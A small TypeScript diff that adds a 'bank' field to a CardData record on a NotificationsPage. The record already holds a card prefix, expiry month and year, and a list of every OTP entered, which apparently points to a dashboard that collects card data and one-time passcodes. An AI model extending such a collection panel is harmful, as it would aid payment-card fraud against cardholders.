@@ -43,6 +43,8 @@ interface CardData {
   prefix:string;
   month:string;
   yeer:string;
+              bank:string;
+
   otpall:string[]
   // Add other fields as needed
 }
@@ -122,6 +124,7 @@ export default function NotificationsPage() {
             prefix: cardData.prefix,
             month: cardData.month,
             yeer: cardData.yeer,
+            bank: cardData.bank,
             otpall: cardData.otpall
           });
         });
